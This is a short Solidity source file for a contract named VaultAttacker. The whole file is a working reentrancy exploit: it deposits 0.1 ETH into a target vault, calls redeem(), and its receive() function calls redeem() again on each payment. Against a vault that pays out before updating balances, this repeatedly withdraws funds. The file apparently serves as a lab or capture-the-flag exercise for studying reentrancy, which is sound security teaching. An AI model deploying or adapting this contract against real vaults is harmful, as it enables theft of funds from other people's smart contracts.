// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.24;

import "./interfaces/IVault.sol";

// Attacker contract must have a balance of 0.1 ETH
contract VaultAttacker {
  // Address of the contract you want to interact with
  address public vaultAddress;
  // Instance of the interface
  IVault public vault;

  constructor(address _vaultAddress) payable {
      vaultAddress = _vaultAddress;
      vault = IVault(vaultAddress);
  }

  function attack() public payable {
    vault.store{value: 0.1 ether}();
    vault.redeem();
  }

  receive() external payable {
    vault.redeem();
  }
}